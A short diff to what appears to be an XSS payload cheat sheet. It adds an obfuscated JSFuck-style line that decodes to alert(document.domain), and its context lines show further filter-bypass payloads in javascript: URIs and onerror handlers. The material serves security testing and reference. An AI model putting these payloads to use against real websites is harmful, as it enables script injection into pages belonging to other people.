@@ -263,6 +263,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   javascript:%26%23x3A%3Bconfirm(1)
   <vIdeO><sourCe onerror="['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])">
   <video><source onerror="alert.constructor.constructor('return this')().alert('‏0f')">
+  [][`filter`][`constructor`](String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()
   ```
 </details>
 
